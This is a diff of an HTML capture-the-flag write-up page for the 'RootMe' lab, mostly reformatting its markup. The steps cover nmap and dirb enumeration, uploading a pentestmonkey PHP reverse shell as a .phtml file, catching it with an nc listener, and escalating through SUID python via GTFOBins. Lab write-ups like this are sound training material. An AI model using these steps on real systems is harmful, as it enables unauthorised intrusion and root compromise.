@@ -19,35 +19,28 @@
 </p>
 
       <img src="/writeups/images/rootme1.png" height="100%" width="100%">
-      <h4>        1. Scan the machine with:
-        
-        nmap target_ip</h4><img src="/writeups/images/rootme2.png" height="100%" width="100%"><p>nmap target_ip -p 80 -sV -A
+      <h4>Scan the machine with: nmap target_ip</h4><img src="/writeups/images/rootme2.png" height="100%" width="100%"><p>nmap target_ip -p 80 -sV -A
         </p><img src="/writeups/images/rootme3.png" height="100%" width="100%"><p>Enumerate directories: dirb http://target_ip /usr/share/wordlists/dirb/common.txt
           
-          Navigate to hidden path</p><img src="/writeups/images/rootme4.png" height="100%" width="100%"><p>3. Upload php payload (I used pentestmonkey github php payload)
-
-            change ip to your machine_ip
-            Save with filename.phtml
+          Navigate to hidden path</p><img src="/writeups/images/rootme4.png" height="100%" width="100%"><p>Upload php payload (I used pentestmonkey github php payload) change ip to your machine_ip  Save with filename.phtml
             
-            4. Start a listener
-            
-            nc -lvnp chosen_port</p><img src="/writeups/images/rootme5.png" height="100%" width="100%"><p>5. Navigate to target_ip/uploads/[filename]
+            <p>Start a listener: nc -lvnp chosen_port</p></p><img src="/writeups/images/rootme5.png" height="100%" width="100%"><p>Navigate to target_ip/uploads/[filename]
 
-              6. You have a shell!</p><img src="/writeups/images/rootme6.png" height="100%" width="100%"><p>Search for file
+            </p><p>You have a shell!</p><img src="/writeups/images/rootme6.png" height="100%" width="100%"><p>Search for file:</p><p>
 
                 find / | grep -w "user.txt"
                 
                 cat [path]/user.txt
                 
-                Search for SUID files
+                </p><p>Search for SUID files
                 
-                find / -user root -perm /4000
+                <p>find / -user root -perm /4000</p>
                 
-                found the file!
+                found the file!:
                 
                 usr/bin/python
                 
-                navigate to gtfobins https://gtfobins.github.io/ 
+                <p>navigate to gtfobins https://gtfobins.github.io/</p> 
                 </p><img src="/writeups/images/rootme7.png" height="100%" width="100%"><p>search python [SUID]
 
                   I only used the 2nd line.</p><img src="/writeups/images/rootme8.png" height="100%" width="100%">
@@ -55,7 +48,7 @@
 
         find / | grep -w "root.txt"
         
-        cat [path]/root.txt</p>
+        <p>cat [path]/root.txt</p></p>
     </main>
   </body>
 </html>
